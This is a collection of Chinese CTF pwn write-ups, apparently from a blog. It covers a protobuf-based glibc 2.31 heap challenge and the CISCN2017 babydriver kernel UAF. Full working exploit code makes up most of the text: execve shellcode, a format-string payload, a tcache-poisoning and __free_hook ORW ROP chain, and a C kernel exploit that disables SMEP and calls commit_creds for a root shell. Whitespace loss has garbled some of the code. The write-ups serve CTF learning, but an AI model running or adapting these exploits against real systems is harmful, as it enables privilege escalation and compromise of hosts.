# !/usr/bin/env python3# -*- coding: utf-8 -*-#@Author:X1NRIshe_i386_20=b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"she_amd64_30=b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"s = lambda payload:io.send(payload)sl   = lambda payload:io.sendline(payload)sa   = lambda data,payload:io.sendafter(data,payload)sla  = lambda data,payload:io.sendlineafter(data,payload)r    = lambda num   :io.recv(numb=num)ru   = lambda data,DROP:io.recvuntil(data,drop=DROP)rl = lambda :io.recvline(keepends=True)uu32 = lambda :u32(io.recvuntil(b'\xf7')[-4:].ljust(4,b"\x00") ) uu64 = lambda :u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b"\x00") )ep = lambda data :elf.plt[data]eg = lambda data :elf.got[data]es = lambda data           :elf.sym[data]ls = lambda data :libc.sym[data]itr  = lambda :io.interactive()ic   = lambda :io.close()pt   = lambda s:log.info('\033[1;31;40m %s --- %s \033[0m' % (s,type(eval(s))))lg   = lambda name,addr :log.success('\033[1;31;40m{} ==> {:#x}\033[0m'.format(name, addr))lg1  = lambda name,addr :log.success('\033[1;31;34m{} ==> {:#x}\033[0m'.format(name, addr))lg2  = lambda name,addr :log.success('\033[1;31;37m{} ==> {:#x}\033[0m'.format(name, addr))pn   = lambda name          :print("\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"%(name,hex(name)))def dbg(command): #dbg(None)gdb.attach(io,gdbscript=command)#pause()#------------------------------------------------------------------------------------------from pwn import*from LibcSearcher import LibcSearchercontext(os="linux",arch="amd64")#context.terminal=["tmux","splitw","-h"]binary="./pwn"context.log_level="debug"elf=ELF(binary)libc=elf.libc#------------------------------------------------------------------choose=1if choose==1:#ENV={"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"}#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)io=process(binary)else:io=remote("123.56.237.147",45570)#------------------------------------------------------------------def pwn():start=0x0000000000401150bss=0x0000000000404060orwchain=shellcraft.open('./flag',0,0)orwchain+=shellcraft.read(1,'rsp',0x60)orwchain+=shellcraft.write(2,'rsp',0x60)payload=b'%'+str(712+0x20).encode()+b'c%34$hn' #34payload=payload.ljust(0x20,b'a')payload+=p64(bss+0x28)payload+=asm(orwchain)#dbg('b *0x000000000040146C\nc\n')sa('start!',payload)itr()if __name__ == '__main__':pwn()

chat

一道4解题，在赛后解出来了😠

【2.31-0ubuntu9.12】堆风水，protobuf序列化，2.31堆沙盒
保护全开，还是沙盒

程序分析

有增删查改四个功能，不过在开始的choose上就难住了我们

  menu();  v4 = read(0, buf, 0x10uLL);               // choose  if ( v4 >= 0x11 )    my_error("Read Failed");  v5 = sub_1C15(0LL, v4, buf);  v3 = *(v5 + 32);  if ( v3 != 4 )    break;  edit(v5);}if ( v3 > 4 )  break;switch ( v3 ){  case 3u:    show(v5);    break;  case 1u:    add(v5);    break;  case 2u:    delete(v5);    break;  default:    goto LABEL_14;}

依据v3来进行选择，而v3=*(v5+32)；而v5由v5 = sub_1C15(0LL, v4, buf);得到，其中v4是我们输入的长度，buf是输入的内容。这个函数如下：

这貌似是一个解包函数，对我们的输入内容进行解包。经过浏览器搜索可知是protobuf序列化，我们需要传入一个结构体并进行protobuf打包，网上教程很多，在此不再赘述

Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的序列化结构的数据格式，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。

如何确定结构体成员，在.data.rel.ro段看出了端倪

再经过对各功能函数偏移的分析，可知结构体如下：

struct msg {char* flag ;long int choice;long int idx;long int size;

  • add

    int __fastcall add(__int64 a1){  int v2; // [rsp+14h] [rbp-Ch]  void *v3; // [rsp+18h] [rbp-8h]  if ( strcmp("ADD", *(const char **)(a1 + 0x18)) )// flag:0x18    my_error("Wrong flag");  v2 = *(_DWORD *)(a1 + 0x28);                  // idx:0x28  if ( *((_DWORD *)&unk_4060 + 4 * v2) != -1 )    my_error("Wrong idx");  *((_DWORD *)&unk_4060 + 4 * v2) = v2;  *((_DWORD *)&unk_4064 + 4 * v2) = *(_DWORD *)(a1 + 0x30);// size:0x30  if ( *((_DWORD *)&unk_4064 + 4 * v2) > 0x80u )// 只能在0x80以内    my_error("Wrong size");  v3 = malloc(*((unsigned int *)&unk_4064 + 4 * v2));  if ( !v3 )    my_error("Malloc failed");  heaparray[2 * v2] = v3;  puts("Please input the content: ");  if ( read(0, (void *)heaparray[2 * v2], *((unsigned int *)&unk_4064 + 4 * v2)) < 0 )    my_error("Read Failed");  return puts("Add success!");}

  • delete

    void __fastcall sub_179D(__int64 a1){  unsigned int v1; // [rsp+1Ch] [rbp-4h]  if ( strcmp("DELETE", *(const char **)(a1 + 24)) )    my_error("Wrong flag");  v1 = *(_DWORD *)(a1 + 40);  if ( *((_DWORD *)&unk_4060 + 4 * v1) == -1 || *((_DWORD *)&unk_4064 + 4 * v1) == -1 )    my_error("Wrong idx");  free((void *)heaparray[2 * v1]);              // uaf}

    有一个uaf

  • show

    int __fastcall sub_1916(__int64 a1){  unsigned int v2; // [rsp+1Ch] [rbp-4h]  if ( strcmp("SHOW", *(const char **)(a1 + 0x18)) )    my_error("Wrong flag");  v2 = *(_DWORD *)(a1 + 40);  if ( *((_DWORD *)&unk_4060 + 4 * v2) == -1 || *((_DWORD *)&unk_4064 + 4 * v2) == -1 )    my_error("Wrong idx");  return puts((const char *)heaparray[2 * v2]);}

  • edit

    ssize_t __fastcall sub_183C(__int64 a1){  ssize_t result; // rax  unsigned int v2; // [rsp+1Ch] [rbp-4h]  if ( strcmp("EDIT", *(const char **)(a1 + 24)) )    my_error("Wrong flag");  v2 = *(_DWORD *)(a1 + 40);  if ( *((_DWORD *)&unk_4060 + 4 * v2) == -1 || *((_DWORD *)&unk_4064 + 4 * v2) == -1 )    my_error("Wrong idx");  puts("Please input the content: ");  result = read(0, (void *)heaparray[2 * v2], *((unsigned int *)&unk_4064 + 4 * v2));  if ( result < 0 )    my_error("Read Failed");  return result;}

EXP

输入的size只能在0x80以内，我们只能得到tcachebin chunk和fastbin chunk，对于利用我们有以下几个难题：

  1. 泄露libc：没有unsortedbin chunk，想过利用malloc_consolidate得到unsortedbin chunk，但是申请chunk时会出现0x40和0x20的chunk与其它chunk分隔开，无法触发malloc_consolidate来合并fastbin

    对策：我们能得到堆地址，利用tcache posioning篡改其它tcache chunk->size，得到unsortedbin chunk

  2. 要打2.31的orw，0x80的chunk大小无法容纳srop_frame

有这样一个gadget，可以通过rdi控制rdx：

pwndbg> pdisass getkeyserv_handle+576 ► 0x7f0d55f0f930 <getkeyserv_handle+576>    mov    rdx, qword ptr [rdi + 8]   0x7f0d55f0f934 <getkeyserv_handle+580>    mov    qword ptr [rsp], rax   0x7f0d55f0f938 <getkeyserv_handle+584>    call   qword ptr [rdx + 0x20]

我们不需要控制全部的frame，只需要frame的rsp和rip位，偏移为0xa8：

我们可以利用堆风水技巧，这样进行堆的排布：

  1. chunk无法容纳：要打2.31的orw，0x80的chunk大小无法容纳0xa8的orwchain
    对策：既然我们能控制执行流了，直接调用read进行堆上写并调用，然后我们手动发送orw即可

    EXP：
    # !/usr/bin/env python3# -*- coding: utf-8 -*-#@Author:X1NRIshe_i386_20=b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"she_amd64_30=b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"s = lambda payload:io.send(payload)sl   = lambda payload:io.sendline(payload)sa   = lambda data,payload:io.sendafter(data,payload)sla  = lambda data,payload:io.sendlineafter(data,payload)r    = lambda num   :io.recv(numb=num)ru   = lambda data,DROP:io.recvuntil(data,drop=DROP)rl = lambda :io.recvline(keepends=True)uu32 = lambda :u32(io.recvuntil(b'\xf7')[-4:].ljust(4,b"\x00") ) uu64 = lambda :io.interactive()ic   = lambda :io.close()pt   = lambda s:log.info('\033[1;31;40m %s --- %s \033[0m' % (s,type(eval(s))))lg   = lambda name,addr :log.success('\033[1;31;40m{} ==> {:#x}\033[0m'.format(name, addr))lg1  = lambda name,addr :log.success('\033[1;31;34m{} ==> {:#x}\033[0m'.format(name, addr))lg2  = lambda name,addr :log.success('\033[1;31;37m{} ==> {:#x}\033[0m'.format(name, addr))pn   = lambda name          :print("\033[01;38;5;214mOCT:%d\nHEX:%s \033[0m"%(name,hex(name)))def dbg(command): #dbg(None)gdb.attach(io,gdbscript=command)#pause() x1nri_pb2context(os="linux",arch="amd64")#context.terminal=["tmux","splitw","-h"]binary="./chat"#context.log_level="debug"elf=ELF(binary)libc=elf.libc#------------------------------------------------------------------choose=1if choose==1:#ENV={"LD_PRELOAD":"/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"}#io=process(["/home/xinri/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so",name],env=ENV)io=process(binary)else:io=remote("")def botmessage(flag:str, choice:int, idx:int, size:int):msg=x1nri_pb2.msg()msg.flag=flag.ljust(8,'\x00')msg.choice=choicemsg.idx=idxmsg.size=sizereturn msg.SerializeToString()def add(idx,size,content):sa('Please input your data: ',botmessage('ADD', 1, idx, size))sa('Please input the content: ', content)def delete(idx):sa('Please input your data: ',botmessage('DELETE', 2, idx, 0))def show(idx):sa('Please input your data: ',botmessage('SHOW', 3, idx, 0))def edit(idx,content):sa('Please input your data: ',botmessage('EDIT', 4, idx, len(content)))sa('Please input the content: ', content)#------------------------------------------------------------------def pwn():#-----leak heapadd(0,0x70,'aaaa')add(1,0x70,b'aaaa')add(2,0x70,b'aaaa')delete(0)delete(1)delete(2)show(2)ru('\n',True)leakheap=u64(r(6).ljust(8,b'\x00'))heap_base=leakheap-0x3e0lg('heap_base',heap_base)#-------control size to leak libctarget=heap_base+0x2e0#0edit(2,p64(target))add(3,0x70,b'aaaa')add(4,0x70,b'a'*0x18+p64(0x421))delete(0)add(5,0x60,b'a'*0x8)add(6,0x60,b'a'*0x8)show(5)libc.address=uu64()-0x1ecbe0lg('libc_base',libc.address)delete(5)delete(6)edit(6,p64(ls('__free_hook')));lg('__free_hook',ls('__free_hook'))add(7,0x60,b'aaaa')getkeyserv_handle_576=0x0000000000151990+libc.address#---------getkeyserv_handle_576add(8,0x68,p64(getkeyserv_handle_576))#__free_hookadd(9,0x68,b'aaaa')add(10,0x68,b'frame1');lg('frame1chunk_mem',heap_base+0x930)#setcontextadd(11,0x68,b'frame2');lg('frame2chunk_mem',heap_base+0xa00)#frameadd(12,0x68,b'rop');lg('ropchunk_mem',heap_base+0xad0)edit(9,p64(0)+p64(heap_base+0x930+0x30))#rdxedit(10,p64(0)*4+p64(0)*6+p64(ls('setcontext')+61))edit(11,p64(heap_base+0xad0)+p64(0x0000000000022679+libc.address))#frame=p64(0)+p64(heap_base+0xa00)+p64(0x000000000000101a+libc.address)#rcx,rsp,rip#edit(10,bytes(frame))rdi=0x0000000000023b6a+libc.addressrsi=0x000000000002601f+libc.addressrdx=0x0000000000142c92+libc.addressOPEN=ls('open')READ=ls('read')WRITE=ls('write')#---------pivotpop_rsp_ret=0x000000000002f70a+libc.addresspivot=flat([rdi,0,rsi,heap_base+0x400,rdx,0x100,READ])pivot+=flat([pop_rsp_ret,heap_base+0x400])edit(12,pivot)#dbg('')delete(9)#----------orwflag_addr=heap_base+0x400+7*3*8target=heap_base+0x500orw=flat([rdi,flag_addr,rsi,0,rdx,0,OPEN])orw+=flat([rdi,3,rsi,target,rdx,0x100,READ])orw+=flat([rdi,1,rsi,target,rdx,0x100,WRITE])orw+=b'./flag\x00's(orw)itr()if __name__ == '__main__':pwn()

x1nri.proto：

syntax = "proto2"; package tutorial; message msg {required string flag = 1;required int64 choice = 2;required int64 idx = 3;required int64 size = 4;}

entry.title: Kernel Heap - Use After Free
entry.content:
参考文章：【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog

一、前言

UAF 即 Use After Free，通常指的是对于释放后未重置的垂悬指针的利用，此前在用户态下的 heap 阶段对于 ptmalloc 的利用很多都是基于UAF漏洞进行进一步的利用。

在 CTF 当中，内核的“堆内存”主要指的是线性映射区（direct mapping area），常用的分配函数 kmalloc 从此处分配内存，常用的分配器为 slub，若是在 kernel 中存在着垂悬指针，我们同样可以以此完成对 slab/slub 内存分配器的利用，通过 Kernel UAF 完成提权。

二、Kernel Heap 首杀：CISCN2017 - babydriver

(一)程序分析

boot.sh

#!/bin/bashqemu-system-x86_64 -initrd core.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s

（好乱）
开了smep

core/init

#!/bin/sh mount -t proc none /procmount -t sysfs none /sysmount -t devtmpfs devtmpfs /devchown root:root flagchmod 400 flagexec 0</dev/consoleexec 1>/dev/consoleexec 2>/dev/consoleinsmod /lib/modules/4.4.72/babydriver.kochmod 777 /dev/babydevecho -e "
Boot took $(cut -d' ' -f1 /proc/uptime) seconds
"setsid cttyhack setuidgid 1000 shumount /procumount /syspoweroff -d 0  -f

LKMs的位置在 /lib/modules/4.4.72/babydriver.ko

babydriver.ko

只开了NX

babydriver_init()

在驱动被加载时会初始化一个设备节点文件/dev/babydev

babyopen()

int __fastcall babyopen(inode *inode, file *filp){  _fentry__(inode, filp);  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 64LL);  babydev_struct.device_buf_len = 64LL;  printk("device open
");  return 0;}

在我们使用open()打开设备文件时该驱动会分配一个64byte的chunk

kmem_cache_alloc_trace函数是Linux内核中的一个函数，用于从特定的缓存获取对象
cachep：用于获取对象的缓存。
flags：精确描述分配特征的标志变量
size：获取的大小

并将返回的堆指针和size放入以下的全局变量babydev_struct中：

struct babydevice_t{char *device_buf;size_t device_buf_len;};

babyioctl()


使用 ioctl 进行通信则可以重新申请内存，释放掉原chunk，并重新申请自定义大小的chunk

babyread()


反汇编有点问题，看下汇编，是在调用copy_from_user之前会检查device_buf_len是否大于用户要求的长度，否则不会执行

从kernel->user写数据

babywrite()


同理，从user->kernel写数据

babyrelease()

再关闭设备文件时释放掉了chunk，但是没有置空指针，存在UAF漏洞

(二)EXP

攻击思路

ropper看一下gadget：

  • 有swapgs和iretq
  • 有mov cr4, ...的gadget，可以关闭SMEP保护
  • 内核函数表可读

攻击思路：

  1. 打开两个/dev/babydriver（分别为fd1、fd2），对fd1进行ioctl将size改为sizef(struct tty_struct)，并释放该chunk。由于UAF我们的fd2能够继续访问该freechunk
  2. 打开 /dev/ptmx，会分配一个tty_struct结构体（正好是释放掉的那个chunk），此时我们便可以通过fd2访问该chunk，即纂改tty_struct->*ops。又因为没开启SMAP我们便可以在用户态构造fake tty_operations写ropchain进行提权。
  3. 当然由于内核中没有one_gadget之类的东西，我们还需要进行栈迁移，将栈迁移到我们的fake tty_operations

使用gdb进行调试，观察内核在调用我们的恶意函数指针时各寄存器的值，我们在这里选择劫持tty_operaionts结构体到用户态的栈上，并选择任意一条内核gadget作为fake tty函数（我选择的是babywrite）指针以方便下断点。

在我们调用tty_operations->write时，其rax寄存器中存放的便是tty_operations结构体的地址：

因此若是我们能够在内核中找到形如mov rsp, rax的gadget，便能够成功地将栈迁移到tty_operations结构体的开头：

这里同时使用了ropper和ROPgadget，两者找到的gadget有差异


可见jmp 0xffffffff8181bf7e;即ret;，我们便选择0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e作为我们栈劫持的gadget

  1. 现在我们将栈劫持到了fake_ops顶端，不过由于fake_ops离write距离太小不够塞入ropchain，我们需要再一次进行栈劫持

  1. 将栈劫持到rop上，完成利用

补充：
一开始出现出现这样的报错

查了一些资料过后，发现很可能是PTI保护机制的问题，在尝试关闭PTI无果之后，发现其实可以通过对特定signal的处理来继续完成利用，比如说PTI机制这里会抛出的11号信号，给他处理成getRootshell这个函数就行了，因为在这之前已经完成了bypass smep和prepare_kernel_cred(commit_creds(0))的操作。

（本来想用swapgs_restore_regs_and_return_to_usermode的，不过这个题内核版本4.4.72太老了，貌似还并没有引进这个函数）

自写exp

#include <stdio.h>#include <string.h>#include <stdlib.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/ioctl.h>#define SWAPGS_POP_RBP_RET 0xffffffff81063694;#define IRETQ_RET 0xffffffff814e35ef;#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80;#define POP_RDI_RET 0xffffffff810d238d;#define POP_RSP_RET 0xffffffff81171045;#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5;#define POP_RAX_RSP 0xffffffff8100ce6e; size_t commit_creds_addr = 0xffffffff810a1420;size_t prepare_kernel_cred_addr = 0xffffffff810a1810;/*user_cs;user_rflags;user_sp;user_ss;*/size_t user_cs,user_ss,user_sp,user_rflags;void saveStatus(){__asm__ __volatile__("mov user_cs,cs;""mov user_ss,ss;""mov user_sp,rsp;""pushf;""pop user_rflags;"    );puts("[*] Success to saveStatus!");}void errExit(char * msg){    printf("\033[1;31m[-] Error : %s\033[0m
", msg);    exit(EXIT_FAILURE);}void getRootShell(){if (!getuid()){puts("\033[1;31;37m[+] <Successfully Get Root Privileges>\033[0m");system("/bin/sh");}else{puts("\033[1;31m[-] <Get Root Error>\033[0m");}}void getRootRrivilege(){void* (*prepare_kernel_cred)(void*) = prepare_kernel_cred_addr;int (*commit_creds)(void*) = commit_creds_addr;(*commit_creds)((*prepare_kernel_cred)(NULL));}int main(int argc, char *argv[], char *envp[]){signal(11, (size_t)getRootShell);saveStatus();/*fd2 control tty_struct*/int fd1 = open("/dev/babydev", O_RDWR);if (fd1<0){errExit("Failed to open fd1!");}int fd2 = open("/dev/babydev", O_RDWR);if (fd2<0){errExit("Failed to open fd2!");}ioctl(fd1, 0x10001, 0x2e0);close(fd1);int tty_fd = open("/dev/ptmx", O_RDWR);if (tty_fd<0){errExit("Failed to open tty_fd!");}size_t rop[0x100];int i =0;/*bypass SMAP*/rop[i++]=POP_RDI_RET;rop[i++]=0x6f0;rop[i++]=MOV_CR4_RDI_POP_RBP_RET;rop[i++]=0;/*getroot*/rop[i++]=(size_t)getRootRrivilege;rop[i++]=SWAPGS_POP_RBP_RET;rop[i++]=0;rop[i++]=IRETQ_RET;rop[i++]=(size_t)getRootShell;rop[i++]=user_cs;rop[i++]=user_rflags;rop[i++]=user_sp;rop[i++]=user_ss;size_t fake_tty_struct[4]={0};size_t fake_ops[0x20]={0};read(fd2, fake_tty_struct, 0x20);fake_tty_struct[3]=fake_ops;printf("[*] fake_ops_addr: %p
", fake_ops);write(fd2, fake_tty_struct, 0x20);fake_ops[7] = MOV_RSP_RAX_DEC_EBX_RET ;fake_ops[0] = POP_RSP_RET;fake_ops[1] = rop;write(tty_fd, "X1NRI", 0x5);}
